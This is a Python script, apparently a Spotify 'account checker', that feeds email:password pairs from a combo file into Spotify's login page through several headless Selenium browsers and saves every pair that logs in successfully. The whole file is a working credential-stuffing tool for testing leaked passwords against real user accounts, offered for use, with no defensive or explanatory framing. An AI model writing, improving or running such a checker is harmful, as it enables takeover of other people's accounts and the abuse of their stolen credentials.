import threading
import numpy as np

import selenium.webdriver as webdriver
from selenium.webdriver.common.by import By
import time

from colorama import Fore
import colorama

# <==== Configs ====>

colorama.init(autoreset=True)

options = webdriver.ChromeOptions()

options.add_argument("--headless")
options.add_argument("--incognito")
options.add_argument('--disable-gpu')
options.add_argument('--disable-extensions')

THREADS = 5
COMBO_PATH = 'accounts.txt'

url = 'https://accounts.spotify.com/pt-BR/login' # 'pt-BR' = brazilian link ⚽

# <==== Configs ====>

with open(COMBO_PATH, 'r') as file:
    accounts = file.read().split('\n')


def check_accounts(account_list):
    if account_list is None:
        return

    browser = webdriver.Chrome(options=options)
    browser.get(url)
    browser.implicitly_wait(999)

    for account in account_list:
        email, password = account.split(':')

        # login process
        browser.find_element(By.CSS_SELECTOR, '#login-username').send_keys(email)
        browser.find_element(By.CSS_SELECTOR, '#login-password').send_keys(password)
        browser.find_element(By.CSS_SELECTOR, '#login-button').click()
        # login process

        time.sleep(1.7)

        # valid
        if browser.current_url == "https://accounts.spotify.com/pt-BR/status":
            print(f"{Fore.GREEN}VALID {email}:{password}")

            with open('valid accounts.txt', 'a') as file:
                file.write(f"{email}:{password}\n")

            browser.find_elements(By.TAG_NAME, 'button')[-1].click()

            time.sleep(0.5)

            browser.get(url)  # login page

            browser.find_element(By.CSS_SELECTOR, '#login-username').clear()
            browser.find_element(By.CSS_SELECTOR, '#login-password').clear()
            continue

        # invalid
        print(f"{Fore.RED}INVALID {email}:{password}")

        browser.find_element(By.CSS_SELECTOR, '#login-username').clear()
        browser.find_element(By.CSS_SELECTOR, '#login-password').clear()
        time.sleep(1)

    browser.close()


print(f"Initializing with {THREADS} threads...")

list_of_accounts = [list(i) for i in np.array_split(accounts, THREADS)]

for accs in list_of_accounts:
    t = threading.Thread(target=check_accounts, args=(accs,))
    t.start()
    time.sleep(0.6)